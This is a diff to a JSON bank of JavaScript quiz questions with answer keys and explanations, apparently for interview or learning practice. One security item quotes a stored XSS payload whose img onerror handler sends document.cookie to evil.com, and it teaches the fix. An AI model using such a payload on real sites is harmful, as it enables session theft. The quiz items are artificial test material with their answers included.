@@ -46,7 +46,7 @@
     "mode": "quick-fire",
     "prompt": "How does JavaScript resolve `obj.someMethod()` when `someMethod` isn't found directly on `obj`?",
     "options": [
-      "It walks up the prototype chain \u2014 `obj`'s prototype, then that prototype's prototype \u2014 until it finds `someMethod` or reaches `null`, then throws a TypeError",
+      "It walks up the prototype chain \u2014 `obj`'s prototype, then that prototype's prototype \u2014 until it finds `someMethod` or reaches `null`, at which point the call throws a TypeError",
       "It falls back to the global scope and calls a global function named `someMethod` if one exists, and only throws if there's no global with that name either",
       "It creates `someMethod` on `obj` as a no-op function that returns `undefined`, so the call completes quietly instead of crashing the program",
       "It throws a ReferenceError immediately, because method lookup only ever checks the object's own properties and never looks anywhere else"
@@ -180,7 +180,7 @@
     "prompt": "What advantage does using an arrow function for a method assigned inside a constructor (e.g. `this.handleClick = () => { ... }`) offer over a regular prototype method?",
     "options": [
       "It lets the method be called before the constructor finishes running, since arrow functions are hoisted to the top of the constructor body",
-      "It binds `this` to the instance when it's created, so the method can be passed as a callback (e.g. to `addEventListener`) without losing `this`",
+      "It binds `this` to the instance at creation, since arrow functions capture `this` lexically, so it can be passed as a callback (e.g. to `addEventListener`) safely",
       "It runs faster than a prototype method in every JS engine, because the engine doesn't need to walk the prototype chain to find it",
       "It makes the method private, since properties created inside the constructor with arrow functions can't be accessed outside the instance"
     ],
@@ -238,7 +238,7 @@
     "options": [
       "Observer pattern, since a settings manager's main job is notifying every listener when a value changes, which keeps all consumers in sync",
       "Factory pattern, since routing every creation through one shared factory function is exactly what stops the app from building conflicting settings objects",
-      "Decorator pattern, since wrapping the base settings object with extra behavior lets every module share and extend one configuration",
+      "Decorator pattern, wrapping the base settings object with extra behavior so every module can share and extend one configuration",
       "Singleton pattern, which guarantees a class has only one instance and one global access point \u2014 e.g. a module that creates it once and exports it"
     ],
     "correctIndex": 3,
@@ -256,7 +256,7 @@
     "mode": "scenario",
     "prompt": "You're building a UI component library where the exact class to instantiate (e.g. `PDFExporter`, `CSVExporter`, `JSONExporter`) depends on a `format` string passed in at runtime, and you don't want calling code to know about each concrete class. Which pattern fits?",
     "options": [
-      "Strategy pattern, since picking PDF vs CSV vs JSON is fundamentally choosing between interchangeable algorithms based on the runtime format",
+      "Strategy pattern, where the calling code constructs the concrete exporter itself (e.g. `new CSVExporter()`) and passes it in, so the library just runs whichever exporter object it's handed",
       "Singleton pattern, so there's only one exporter instance in total that every caller shares, whatever format string they pass in",
       "Observer pattern, so each exporter class subscribes to a shared export event and only the one matching the format string responds",
       "Factory pattern, where one function takes the format string and decides which concrete exporter class to instantiate, hiding that choice from callers"
@@ -276,7 +276,7 @@
     "prompt": "You need multiple parts of your app to react whenever a `user:updated` event happens \u2014 a notifications widget, an analytics tracker, and a UI badge counter \u2014 without any of them knowing about each other. Which pattern is this?",
     "options": [
       "Decorator pattern, since each widget layers its own reaction onto the user object, so updating it triggers all of the wrapped behavior",
-      "Module pattern, since putting each widget in its own private module is what keeps the notifications, analytics, and badge independent",
+      "Module pattern, putting each widget in its own private module so the notifications, analytics, and badge code stay independent of each other",
       "Command pattern, since the update is wrapped as a command object that each widget can execute on its own whenever the user changes",
       "Observer pattern, where a subject keeps a list of subscribers and notifies all of them when an event occurs, without knowing who they are"
     ],
@@ -316,7 +316,7 @@
     "options": [
       "Command pattern, which wraps each action as an object with `execute()` (and usually `undo()`), so actions can be stored, queued, logged, and reversed",
       "Observer pattern, since undo/redo works by notifying subscribers of each change, and each subscriber replays or reverses its own part",
-      "Module pattern, since keeping each action's state in a private module scope is what lets the editor restore earlier versions on undo",
+      "Module pattern, keeping each action's state in a private module scope that the editor reads back from to restore earlier versions on undo",
       "Factory pattern, since every type, delete, and format action is created dynamically by one central factory, which can also recreate earlier editor states on undo"
     ],
     "correctIndex": 0,
@@ -469,7 +469,7 @@
     "options": [
       "Callbacks can't be used for asynchronous operations in modern JavaScript at all, since current browser and Node.js APIs have all moved to accept only Promise-returning functions",
       "Callbacks are always slower at runtime than Promise-based code, because each nested function call adds its own scheduling overhead in the engine",
-      "Deeply nested callbacks make error handling inconsistent (each level needs its own error check) and flow hard to follow; Promises flatten it with one `.catch()`",
+      "Deeply nested callbacks make error handling inconsistent, since each level needs its own error check, and flow hard to follow; Promises flatten it with one `.catch()`",
       "Promises remove the need for any error handling, unlike callbacks, because a rejected Promise is caught and logged automatically by the runtime"
     ],
     "correctIndex": 2,
@@ -583,7 +583,7 @@
     "options": [
       "`'property' in obj`, since the `in` operator only checks the object's own properties and ignores anything that's inherited through the object's prototype chain",
       "`obj.property !== undefined`, since a property that exists on the object always has some value, and only missing properties read as `undefined`",
-      "`Object.hasOwn(obj, 'property')` (or the older `obj.hasOwnProperty`), which checks for an own property and returns `true` even if its value is `undefined`",
+      "`Object.hasOwn(obj, 'property')` (or the older `obj.hasOwnProperty`), since it checks only for an own property and returns `true` even if its value is `undefined`",
       "`typeof obj.property === 'object'`, since `typeof` returns `'undefined'` for missing and inherited properties and `'object'` for own ones"
     ],
     "correctIndex": 2,
@@ -645,7 +645,7 @@
       "Attributes only exist on custom elements, while properties only exist on native HTML elements, so built-in tags like `<input>` don't have attributes at all"
     ],
     "correctIndex": 1,
-    "explanation": "Attributes reflect what was written in the original HTML and are always strings retrieved via `getAttribute()`, while properties are live JS object members that can hold typed values and often update independently \u2014 the classic example is an `<input>`: its `defaultValue` attribute stays fixed to the HTML markup, but its `.value` property changes live as the user types, meaning `getAttribute('value')` and `element.value` can return different results after user interaction.",
+    "explanation": "Attributes reflect what was written in the original HTML and are always strings retrieved via `getAttribute()`, while properties are live JS object members that can hold typed values and often update independently \u2014 the classic example is an `<input>`: its `value` attribute (mirrored by the `defaultValue` property) stays fixed to the HTML markup, but its `.value` property changes live as the user types, meaning `getAttribute('value')` and `element.value` can return different results after user interaction.",
     "references": [
       "MDN: Attribute vs property"
     ],
@@ -675,15 +675,15 @@
     "id": "js-0036",
     "topic": "javascript",
     "mode": "quick-fire",
-    "prompt": "What's the most efficient way to add many new elements to the DOM in one operation, avoiding repeated reflows?",
+    "prompt": "What's the most efficient way to add many new elements to the live DOM in one batch?",
     "options": [
       "Call `appendChild()` in a loop directly on the live parent for each new element, one at a time, so each element shows up on the page as soon as it's ready",
       "There's no way to batch DOM insertions; every `appendChild` call always triggers its own separate reflow, whichever technique or container you use for it",
-      "Build the elements inside a `DocumentFragment`, which lives outside the live DOM, then append the fragment once, triggering a single reflow instead of one per element",
+      "Build the elements inside a `DocumentFragment`, which lives outside the live DOM, then append the fragment once, so the live tree changes in one operation instead of once per element",
       "Use `innerHTML +=` inside the loop to append each element's markup string, since the browser can parse HTML strings much faster than it can create the elements one by one"
     ],
     "correctIndex": 2,
-    "explanation": "A `DocumentFragment` is a lightweight, off-DOM container \u2014 elements appended to it don't trigger layout/reflow since it isn't part of the rendered page, so you can build up an entire batch of elements there and append the whole fragment to the real DOM in a single operation, causing just one reflow. Looping `appendChild` directly on the live parent or repeatedly reading-and-rewriting `innerHTML` (which also re-parses the growing string every iteration) both cause a reflow-triggering operation on every single iteration.",
+    "explanation": "A `DocumentFragment` is a lightweight, off-DOM container: you build the whole batch there, where changes don't touch the rendered page, then append it to the real parent in a single operation (its children move over and the fragment is left empty). Appending one element at a time to the live parent mutates the rendered tree on every iteration, and if any code reads layout in between (like `.offsetHeight`), each of those reads forces a synchronous reflow. Repeated `innerHTML +=` is worse still: it re-serializes and re-parses the growing markup every iteration, destroying and recreating the existing elements. Modern browsers do defer layout until it's needed, so the fragment's main win is fewer live-tree mutations, not a guaranteed count of reflows, and no technique makes every `appendChild` reflow on its own.",
     "references": [
       "MDN: DocumentFragment"
     ],
@@ -770,10 +770,10 @@
     "id": "js-0041",
     "topic": "javascript",
     "mode": "scenario",
-    "prompt": "You build a dynamic to-do list where new `<li>` items are added via JavaScript after page load. You attach a click handler directly to each `<li>` at creation time to handle 'mark complete', but items added later than that setup code don't respond to clicks. What's the robust fix?",
+    "prompt": "You build a dynamic to-do list where new `<li>` items are added via JavaScript after page load. A setup loop that runs once at page load attaches a click handler to each existing `<li>` to handle 'mark complete', but items added after that don't respond to clicks. What's the robust fix?",
     "options": [
       "Switch every click handler to `{ capture: true }` instead of the default bubble phase, so clicks are caught on the way down before the new items can miss them",
-      "Re-run the same per-item listener-attaching code every time a new item is added, no matter how many items already exist, so that every `<li>` on the page, old or new, always ends up with its own handler attached",
+      "Re-run the setup loop over every `<li>` each time an item is added, attaching another handler to every item, old or new, so that each one ends up with at least one listener",
       "This can't be fixed in vanilla JS; a framework like React is needed, since only a virtual DOM can attach handlers to elements created after page load",
       "Attach one click listener to the stable parent `<ul>` and use `event.target` (or `.closest()`) to find the clicked `<li>` \u2014 event delegation, which covers items added later"
     ],
@@ -965,7 +965,7 @@
     "mode": "scenario",
     "prompt": "Your app displays user-submitted comments by inserting them into the page with `commentEl.innerHTML = userComment;`. A user submits a comment containing `<img src=x onerror=\"fetch('https://evil.com/steal?cookie='+document.cookie)\">`. What's happening, and what's the fix?",
     "options": [
-      "This isn't exploitable unless the viewer is an admin, since only admin sessions have cookies valuable enough to steal and ordinary users' requests can't do harm",
+      "This isn't exploitable unless the viewer is an admin: only admin sessions hold cookies valuable enough to steal, and ordinary users' requests can't do harm",
       "This is harmless: the `<img>` tag just fails to load and shows a broken image icon, because browsers never run inline event handlers from content that was added to the page after it loaded",
       "Stored XSS: `innerHTML` renders the markup, so the `onerror` handler runs attacker code in your page; use `textContent`, or sanitize with a library like DOMPurify if HTML is needed",
       "The fix is to reject any comment containing the literal word 'script', since browsers only execute JavaScript that appears inside `<script>` tags in the markup"
@@ -1102,10 +1102,10 @@
     "mode": "quick-fire",
     "prompt": "Why is input validation described as important for security, beyond just improving data quality?",
     "options": [
-      "Input validation should only be done on the client side, since server resources are limited and the browser can reject bad input before any request is sent",
+      "Input validation should only be done on the client side: server resources are limited, and the browser can reject bad input before any request is even sent",
       "Rejecting unexpected input (type, length, format) before it reaches sensitive logic shrinks the attack surface, though it still needs output encoding and parameterized queries",
       "Input validation on its own, with no other measures, fully eliminates SQL injection and XSS, since a malicious payload can't get past a strict enough format rule",
-      "It's purely a UX nicety that helps users fix typos and has no real bearing on security, since attackers send their payloads straight to the API rather than through the form"
+      "It's purely a UX nicety that helps users fix typos and has no real bearing on security, since the database driver and framework already neutralize any malicious input regardless"
     ],
     "correctIndex": 1,
     "explanation": "Constraining what input is even accepted (rejecting a phone number field that contains SQL syntax, for instance) shrinks the range of malicious payloads that ever reach deeper application logic, functioning as one useful layer of defense. However, it's not sufficient alone \u2014 a determined attacker can often craft input that's syntactically 'valid' by a loose validation rule but still dangerous, which is why output encoding and parameterized queries remain necessary as the primary defenses for injection specifically. Client-side-only validation is also insufficient since it's trivially bypassed by directly calling the API.",
@@ -1220,7 +1220,7 @@
     "options": [
       "ES Modules can't export more than one value per file, so files that need several exports have to bundle them into one default-exported object instead",
       "They're functionally and syntactically identical apart from keyword names, so a bundler can convert between them freely without any change in behavior",
-      "CommonJS (`require`) loads modules synchronously at runtime; ES Modules (`import`) are statically analyzable at parse time, which enables tree shaking, and load asynchronously",
+      "CommonJS (`require`) loads modules synchronously at runtime; ES Modules (`import`) are statically analyzable at parse time, which enables tree shaking, and support async loading",
       "CommonJS is only usable in the browser and ES Modules are only usable in Node.js, which is why universal libraries have to publish both formats side by side in their packages"
     ],
     "correctIndex": 2,
@@ -1277,7 +1277,7 @@
     "options": [
       "TypeScript makes code run measurably faster in the browser than equivalent plain JS, since the type information it adds lets JavaScript engines skip their runtime type checks and optimize more aggressively",
       "Static typing catches many bugs at compile time and improves editor tooling, at the cost of a build step, a learning curve, and type friction; the output is plain JS with no speed change",
-      "TypeScript can only be used with React, not with vanilla JS or other frameworks, since its type checking relies on React's component props system",
+      "TypeScript works only with React projects, not vanilla JS or other frameworks; its type checker is built around React's component props system",
       "TypeScript removes the need for testing entirely, since a program that type-checks is guaranteed to behave correctly, so the only cost is the compile step"
     ],
     "correctIndex": 1,
